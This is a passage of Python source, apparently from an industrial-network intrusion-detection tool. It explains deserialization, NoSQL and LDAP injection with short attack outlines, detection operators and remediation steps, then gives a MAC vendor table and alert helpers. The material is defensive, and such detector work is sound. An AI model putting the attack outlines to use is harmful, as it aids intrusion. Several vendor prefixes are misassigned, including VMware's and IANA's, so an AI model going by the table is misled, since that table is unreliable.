        "behavior": "Detected insecure deserialization: PHP unserialize, Java ObjectInputStream, Python pickle.",
        "danger": "Deserialization of untrusted data → arbitrary code execution, complete compromise.",
        "scenario": "1. App deserializes user data\n2. Craft malicious serialized object\n3. Trigger deserialization\n4. Execute arbitrary code\n5. Full system access",
        "risk_level": "CRITICAL - RCE, total compromise",
        "ot_impact": "Deserialization in OT middleware/historians extremely dangerous - direct access to control systems.",
        "remediation": "1. Never deserialize untrusted data\n2. Use safe formats (JSON)\n3. Implement signing/encryption\n4. Update libraries\n5. Input validation",
    },

    "NOSQL_INJECTION": {
        "behavior": "Detected NoSQL injection: $ne, $gt, $where, JavaScript injection in MongoDB queries.",
        "danger": "NoSQL injection bypasses authentication, extracts data, and executes JavaScript.",
        "scenario": "1. Find NoSQL database (MongoDB, etc.)\n2. Inject operators ($ne, $or)\n3. Bypass authentication\n4. Extract data\n5. Command injection via $where",
        "risk_level": "CRITICAL - Auth bypass, data theft",
        "ot_impact": "NoSQL databases storing OT data vulnerable to:\n- Authentication bypass\n- Data extraction\n- Process data theft",
        "remediation": "1. Parameterized queries\n2. Input validation\n3. Disable JavaScript execution\n4. Least privilege\n5. Query monitoring",
    },

    "LDAP_INJECTION": {
        "behavior": "Detected LDAP injection: *, ), (, |, & in LDAP queries.",
        "danger": "LDAP injection bypasses authentication and extracts directory data.",
        "scenario": "1. Find LDAP authentication\n2. Inject LDAP operators\n3. Bypass login\n4. Extract user data\n5. Privilege escalation",
        "risk_level": "HIGH - Auth bypass",
        "ot_impact": "LDAP in OT often controls access to critical systems - bypass can grant full access.",
        "remediation": "1. Escape special characters\n2. Use parameterized queries\n3. Input validation\n4. Least privilege\n5. MFA",
    },
}


def get_attack_explanation(attack_type: str) -> Dict[str, str]:
    """Get detailed explanation for an attack type"""
    # Remove HTTP_ prefix if present for lookup
    lookup_key = attack_type
    if lookup_key.startswith("HTTP_"):
        lookup_key = lookup_key[5:]

    # Try exact match first
    if lookup_key in ATTACK_EXPLANATIONS:
        return ATTACK_EXPLANATIONS[lookup_key]

    # Try partial match
    for key in ATTACK_EXPLANATIONS:
        if key in lookup_key or lookup_key in key:
            return ATTACK_EXPLANATIONS[key]

    # Default explanation
    return {
        "behavior": f"Suspicious activity detected: {attack_type}",
        "danger": "This activity may be a sign of a network attack.",
        "scenario": "Further investigation is needed to determine the cause and extent of impact.",
        "risk_level": "MEDIUM - Needs investigation",
        "ot_impact": "Undetermined - further assessment needed.",
        "remediation": "1. Collect more information\n2. Check logs\n3. Contact the security team",
    }


# =============================================================================
# OUI DATABASE
# =============================================================================

OT_MAC_OUI: Dict[str, str] = {
    # Siemens (additional OUIs)
    "00:00:5E": "Siemens", "00:0E:8C": "Siemens", "00:1B:1B": "Siemens",
    "00:80:F4": "Siemens", "A0:24:AA": "Siemens", "00:50:7F": "Siemens",
    "00:0C:F1": "Siemens", "F0:79:59": "Siemens SCALANCE", "5C:E0:C5": "Siemens",
    "3C:A8:2A": "Siemens", "A0:36:BC": "Siemens", "00:1C:06": "Siemens",

    # Rockwell/Allen-Bradley (additional OUIs)
    "00:00:BC": "Rockwell Automation", "00:1D:9C": "Rockwell Automation",
    "00:C0:F2": "Rockwell Automation", "1C:9E:CC": "Rockwell Automation",
    "B8:E9:37": "Rockwell Automation", "00:00:1D": "Rockwell Automation",
    "74:E7:C6": "Rockwell Stratix", "D4:AD:71": "Rockwell Automation",

    # Schneider Electric (additional OUIs)
    "00:00:C0": "Schneider Electric", "00:80:F0": "Schneider Electric",
    "00:00:54": "Schneider Modicon", "00:80:64": "Schneider Electric",
    "00:06:29": "Schneider Electric", "00:00:88": "Schneider Quantum",
    "00:C1:C0": "Schneider Electric", "70:B3:D5": "Schneider Electric",
    "A4:5D:36": "Schneider Triconex", "00:80:77": "Schneider Electric",

    # ABB (additional OUIs)
    "00:06:0D": "ABB", "00:21:99": "ABB", "00:1F:C4": "ABB",
    "00:10:A3": "ABB Robotics", "00:30:11": "ABB Advant",
    "B8:AC:6F": "ABB", "00:1B:D5": "ABB",

    # Honeywell (additional OUIs)
    "00:D0:C9": "Honeywell", "00:0C:85": "Honeywell",
    "00:E0:63": "Honeywell Experion", "00:00:A2": "Honeywell TDC",
    "00:60:B3": "Honeywell", "78:E3:B5": "Honeywell",

    # Yokogawa (additional OUIs)
    "00:50:C2": "Yokogawa", "00:C0:8D": "Yokogawa",
    "00:07:5F": "Yokogawa", "00:1D:7E": "Yokogawa",
    "D4:76:EA": "Yokogawa", "00:03:C0": "Yokogawa",

    # Mitsubishi (additional OUIs)
    "00:01:B9": "Mitsubishi Electric", "00:19:C5": "Mitsubishi Electric",
    "00:18:1A": "Mitsubishi Electric",
    "F0:B2:E5": "Mitsubishi Electric", "00:0E:8E": "Mitsubishi Electric",

    # Omron (additional OUIs)
    "00:04:9F": "Omron", "00:1A:E8": "Omron",
    "00:02:7D": "Omron", "FC:F1:52": "Omron",
    "00:80:63": "Hirschmann", "70:B3:D5:80": "Omron",

    # Phoenix Contact (additional OUIs)
    "00:60:E9": "Phoenix Contact", "00:A0:45": "Phoenix Contact",
    "00:0F:6C": "Phoenix Contact", "00:1E:C0": "Phoenix Contact",

    # Moxa (additional OUIs)
    "00:0A:E4": "Moxa", "00:90:E8": "Moxa",
    "00:C0:9F": "Moxa", "00:90:E8:02": "Moxa",

    # B&R Automation (additional OUIs)
    "00:60:65": "B&R Automation",
    "00:D0:89": "B&R Automation",

    # Beckhoff (additional OUIs)
    "00:01:05": "Beckhoff Automation",
    "00:00:CE": "Beckhoff EtherCAT",
    "08:00:30": "Beckhoff Automation",

    # Emerson/Fisher (additional OUIs)
    "00:1B:1A": "Emerson Process", "00:D0:28": "Fisher-Rosemount",
    "00:A0:B0": "Emerson DeltaV", "00:50:C2:87": "Emerson",

    # GE (additional OUIs)
    "00:04:75": "GE Fanuc", "08:00:06": "GE",
    "00:A0:6E": "GE Mark VI", "00:30:05": "GE",
    "E8:40:F2": "GE Digital Energy",

    # Wago (additional OUIs)
    "00:30:DE": "WAGO Kontakttechnik",
    "00:0C:06": "WAGO",

    # ===== Additional vendors =====

    # Delta Electronics
    "00:60:E9:4E": "Delta Electronics", "00:1D:48": "Delta Electronics",
    "F4:8E:92": "Delta Electronics",

    # Eaton / Cutler-Hammer
    "00:00:8C": "Eaton", "00:50:73": "Eaton Cutler-Hammer",
    "00:A0:B1": "Eaton",

    # SEL (Schweitzer Engineering Laboratories)
    "00:30:A7": "SEL", "00:1C:0E": "SEL",
    "E8:E7:32": "SEL",

    # KUKA Robotics
    "00:16:EB": "KUKA Robotics", "00:03:EB": "KUKA",

    # FANUC Robotics
    "00:E0:5E": "FANUC Robotics", "00:00:84": "FANUC",

    # Yaskawa / Motoman
    "00:40:8C": "Yaskawa", "00:1F:29": "Yaskawa Motoman",

    # Panasonic Industrial
    "00:80:45": "Panasonic", "04:20:9A": "Panasonic Industrial",

    # Keyence
    "00:07:9F": "Keyence", "00:22:A7": "Keyence",

    # Turck
    "00:0E:8C:9C": "Turck", "00:1E:8C": "Turck",

    # Pepperl+Fuchs
    "00:80:F4:03": "Pepperl+Fuchs", "00:0E:3B": "Pepperl+Fuchs",

    # IFM Electronic
    "00:0C:15": "IFM Electronic", "00:02:B4": "IFM",

    # Pilz
    "00:0E:64": "Pilz", "00:0C:29:3E": "Pilz",

    # Sick
    "00:01:AF": "Sick", "00:16:53": "Sick",

    # Balluff
    "00:0A:3A": "Balluff", "00:0E:F4": "Balluff",

    # Endress+Hauser
    "00:1E:42": "Endress+Hauser", "00:0E:3C": "Endress+Hauser",

    # Rosemount (Emerson)
    "00:0E:83": "Rosemount", "00:12:CF": "Rosemount",

    # Hirschmann
    "00:80:63:01": "Hirschmann", "00:30:F1": "Hirschmann",
    "E0:DC:A0": "Hirschmann",

    # Cisco Industrial (IE switches)
    "00:0A:F4": "Cisco Industrial", "68:BC:0C": "Cisco Industrial",
    "F0:25:72": "Cisco IE",

    # Belden/Lumberg
    "00:A0:6E:01": "Belden Hirschmann", "00:C0:F2:F1": "Belden",

    # Red Lion Controls
    "00:20:4A": "Red Lion Controls", "00:0C:C8": "Red Lion",

    # Watlow
    "00:40:9D": "Watlow", "00:80:A3:1A": "Watlow",

    # Eurotherm
    "00:40:8C:10": "Eurotherm", "00:A0:3B": "Eurotherm",

    # ProSoft Technology
    "00:1C:1D": "ProSoft Technology", "00:C0:8D:01": "ProSoft",

    # Spectrum Controls (3S)
    "00:20:D5": "Spectrum Controls", "00:A0:45:01": "Spectrum",

    # Contemporary Controls
    "00:C0:B7": "Contemporary Controls", "00:80:A3:0C": "Contemporary",

    # HMS Industrial Networks (Anybus)
    "00:30:11:01": "HMS Anybus", "00:1C:06:01": "HMS Industrial",

    # Kunbus (Revolution Pi)
    "D8:3A:DD": "Kunbus Revolution Pi", "00:0C:29:6E": "Kunbus",

    # VIPA (Yaskawa)
    "00:20:D1": "VIPA", "00:40:8C:F1": "VIPA",

    # Koyo/AutomationDirect
    "00:1C:1A": "Koyo", "00:0C:DC": "AutomationDirect",

    # Unitronics
    "00:1C:B3": "Unitronics", "00:0D:AD": "Unitronics",

    # Opto 22
    "00:A0:3D": "Opto 22", "00:C0:1C": "Opto 22",

    # National Instruments
    "00:80:2F": "National Instruments", "00:01:73": "National Instruments",

    # Advantech
    "00:D0:C9:01": "Advantech", "00:07:32": "Advantech",

    # Kontron
    "00:0E:0C": "Kontron", "00:D0:81": "Kontron",

    # Lenze
    "00:0C:15:01": "Lenze", "00:1B:EE": "Lenze",
    # Bosch Rexroth
    "00:0E:38": "Bosch Rexroth", "00:A0:63": "Bosch Rexroth",
    # Parker Hannifin
    "00:20:4C": "Parker Hannifin", "00:80:A3:12": "Parker",
    # Danfoss
    "00:50:C2:38": "Danfoss", "00:1E:C0:01": "Danfoss",
    # Vacon/Danfoss
    "00:1B:AF": "Vacon", "00:40:8C:11": "Vacon Danfoss",

    # Emerson/Control Techniques
    "00:00:BC:01": "Emerson CT", "00:C0:8D:02": "Control Techniques",

    # SEW-Eurodrive
    "00:07:5C": "SEW-Eurodrive", "00:19:DD": "SEW-Eurodrive",

    # Nord Drivesystems
    "00:0E:64:01": "Nord Drivesystems",

    # Leuze Electronic
    "00:0C:DC:01": "Leuze", "00:30:67": "Leuze Electronic",

    # Schmersal
    "00:0A:E6": "Schmersal", "00:01:C0:01": "Schmersal",
    # Banner Engineering
    "00:0C:C8:01": "Banner Engineering",
    # PATLITE
    "00:0D:F0": "PATLITE", "00:80:63:03": "PATLITE",
    # Rittal
    "00:30:05:01": "Rittal", "00:60:DD": "Rittal",
    # Murrelektronik
    "00:0E:8C:01": "Murrelektronik",
    # Wieland Electric
    "00:20:91": "Wieland Electric",
    # Harting
    "00:0C:CC": "Harting", "00:A0:57": "Harting",
    # Weidmuller
    "00:0E:8F": "Weidmuller", "00:1F:84": "Weidmuller",
    # Festo
    "00:0E:F4:01": "Festo", "00:80:F4:01": "Festo",
    # SMC Corporation
    "00:0C:E7": "SMC", "00:1E:8C:01": "SMC",
    # Norgren/IMI Precision
    "00:40:8C:12": "Norgren", "00:C0:F2:02": "IMI Precision",
    # Numatics/Emerson
    "00:D0:C9:02": "Numatics",
    # Burkert
    "00:30:18": "Burkert", "00:0C:15:02": "Burkert",
    # Asco/Emerson
    "00:1B:1A:01": "Asco Numatics",
    # Camozzi
    "00:0D:5F": "Camozzi",
    # Metal Work
    "00:1E:C0:02": "Metal Work",
    # Norgren/Herion
    "00:80:F4:02": "Herion",
}


# =============================================================================
# HELPER FUNCTIONS
# =============================================================================

def get_vendor(mac: str) -> str:
    """Get vendor name from MAC address (longest-prefix match: MA-S/MA-M, then OUI)."""
    if not mac:
        return "Unknown"
    norm = mac.upper().replace("-", ":")
    for length in (14, 11, 8):  # 5-, 4- and 3-byte prefixes
        vendor = OT_MAC_OUI.get(norm[:length])
        if vendor:
            return vendor
    return "Unknown"


def get_function_description(protocol: str, function_code: int) -> str:
    """Get a human-readable description for a function code"""
    if protocol == "MODBUS" or protocol == "MODBUS_TCP":
        return MODBUS_FUNCTION_DESCRIPTIONS.get(function_code, f"Function code {function_code}")
    elif protocol == "S7COMM":
        return S7_FUNCTION_DESCRIPTIONS.get(function_code, f"S7 function code 0x{function_code:02X}")
    return f"Function {function_code}"


def get_mitre_tooltip(technique_id: str) -> str:
    """Get descriptive tooltip for MITRE technique"""
    return MITRE_TOOLTIPS.get(technique_id,
        MITRE_ATTACK_ICS.get(technique_id, "Unclassified attack technique"))


def classify_alert(anomaly_type: str, description: str = "") -> str:
    """Classify alert into category"""
    text_to_check = f"{anomaly_type} {description}".upper()
    for category, info in ALERT_CATEGORIES.items():
        for indicator in info["indicators"]:
            if indicator in text_to_check:
                return category
    return "INFORMATIONAL"


def get_remediation_guidance(event_type: str, src_ip: str, dst_ip: str,
                              protocol: str, timestamp: str) -> Dict[str, str]:
    """Get remediation guidance for an event"""
    template_key = "DEFAULT"
    event_upper = event_type.upper()

    if any(x in event_upper for x in ["WRITE", "CONTROL", "COMMAND", "SET"]):
        template_key = "WRITE_COMMAND"
    elif any(x in event_upper for x in ["FIRMWARE", "UPDATE", "UPLOAD"]):
        template_key = "FIRMWARE_UPDATE"
    elif any(x in event_upper for x in ["STOP", "SHUTDOWN", "RESTART", "RESET"]):
        template_key = "PLC_STOP"
    elif any(x in event_upper for x in ["SCAN", "DISCOVERY", "PROBE"]):
        template_key = "SCAN_ACTIVITY"

    template = REMEDIATION_TEMPLATES[template_key]
    return {
        "title": template["title"],
        "guidance": template["guidance"],
        "priority": template["priority"]
    }


def get_it_attack_info(attack_type: str) -> Dict[str, Any]:
    """Get IT attack information"""
    return IT_ATTACK_SIGNATURES.get(attack_type, {
        "name": attack_type,
        "description": "Unclassified attack type",
        "severity": "MEDIUM",
        "mitre": [],
    })


def get_suspicious_port_info(port: int) -> Optional[Dict[str, str]]:
    """Get information about suspicious port"""
    if port in SUSPICIOUS_PORTS:
        name, severity, desc = SUSPICIOUS_PORTS[port]
        return {"name": name, "severity": severity, "description": desc}
    if port in IT_ADMIN_PROTOCOLS:
        info = IT_ADMIN_PROTOCOLS[port]
        return {"name": info["name"], "severity": info["risk_in_ot"], "description": info["desc"]}
    return None
